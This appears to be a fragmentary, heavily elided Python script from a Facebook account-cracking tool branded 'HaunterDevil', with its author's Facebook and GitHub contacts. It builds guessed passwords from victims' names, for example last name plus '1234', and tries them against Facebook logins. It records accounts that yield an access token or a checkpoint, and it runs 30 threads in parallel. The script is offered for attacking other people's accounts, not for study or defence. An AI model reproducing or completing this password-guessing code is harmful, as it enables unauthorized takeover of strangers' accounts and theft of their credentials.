...
\033[1;92m☞ FACEBOOK   : https://www.facebook.com/alamin.60
\033[1;95m☞ Github    : https://github.com/DevillHaunter
...
def menu():
	...
	print (S + '[' + P + '☞3' + S + ']' + S + ' Contact Me In Facebook For Any Help')
...
def mb():
	...
	if bm =='':
	    ...
	    psb('Facebook Contact alaminkhan.60✓')
	    psb('WellCome To HAUNTERDEVILL')
	    psb('Congratulations HaunterDevil Tool Has Been Updated Successfully')
			...
			if 'www.facebook.com' in k['error_msg']:
			    ...
			    if 'access_token' in k:
			        ...
			        if 'www.facebook.com' in k['error_msg']:
			            ...
			            if 'access_token' in k:
			                print(G+'[LOG IN AFTER 3HOURS] ♡ '+user+' ♡ '+ps2)
			                oks.append(user+ps2)
			            else:
			                ...
			                if 'www.facebook.com' in k['error_msg']:
			                    ...
			                    if 'access_token' in k:
			                        print(G+'[LOG IN AFTER 3HOURS] ♡ '+user+' ♡ '+ps3)
			                        oks.append(user+ps3)
			                    else:
			                        ...
			                        if 'www.facebook.com' in k['error_msg']:
			                            ...
			                            if 'access_token' in k:
			                                print(G+'[LOG IN AFTER 3HOURS] ♡ '+user+' ♡ '+ps4)
			                                oks.append(user+ps4)
			                            else:
			                                ps5=(j['last_name']+'1234')
			                                ...
			                                if 'www.facebook.com' in k['error_msg']:
			                                    ...
			                                    if 'access_token' in k:
			                                        ...
			                                        if 'www.facebook.com' in k['error_msg']:
			                                            ...
			                                            if 'access_token' in k:
			                                                print(G+'[LOG IN AFTER 3HOURS] ♡ '+user+' ♡ '+ps6)
			                                                oks.append(user+ps6)
		except:
			pass
	p=ThreadPool(30)
